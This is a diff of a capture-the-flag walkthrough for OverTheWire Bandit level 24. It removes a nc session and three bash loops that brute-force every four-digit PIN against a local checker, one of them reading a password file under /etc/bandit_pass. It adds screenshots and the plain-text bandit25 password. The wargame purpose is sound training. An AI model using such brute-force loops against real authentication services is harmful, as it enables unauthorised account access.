@@ -803,56 +803,9 @@ kali@kali:~$ ssh bandit.labs.overthewire.org -l bandit24 -p2220
 
 bandit24@bandit.labs.overthewire.org''s password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
-bandit24@bandit:~$ nc localhost 30002
-I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
-Timeout. Exiting.
+![image](https://user-images.githubusercontent.com/96256687/148093252-df3707e5-f447-42a3-84d6-c9c4918d463d.png)
 
-bandit24@bandit:~$ cd /tmp/
-bandit24@bandit:/tmp$ nano basher.sh
-Unable to create directory /home/bandit24/.nano: Permission denied
-It is required for saving/loading search history or cursor positions.
+![image](https://user-images.githubusercontent.com/96256687/148093344-eb5eaa1f-16de-4f43-8173-1f4c3b3ce8d5.png)
 
-Press Enter to continue
-
-#!/bin/bash
-
-pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
-for i in {1000..10000}
-do {
-if
-    echo $pass $i| nc localhost 30002 | grep Wrong > /dev/null
-then
-    echo $i
-else
-    echo $pass $i| nc localhost 30002
-    exit
-fi
-}
-done
-
-////////////////////////////////////////////////////
-
-#!/bin/bash
-
-password=$(cat /etc/bandit_pass/bandit24)
-
-for i in $(seq -w 9999); 
-do
-    echo "$password $i" | nc localhost 30002 
-done
-
-////////////////////////////////////////////////////
-
-#!/bin/bash
-passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
-
-for a in {0..9}{0..9}{0..9}{0..9}
-do
-    echo $passwd' '$a | nc localhost 30002 >> result &
-done
-
-/////////////////////////////////////////////////////
-
-
-bandit24@bandit:/tmp$ ./basher.sh
-**********************************
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+*****************************************************************
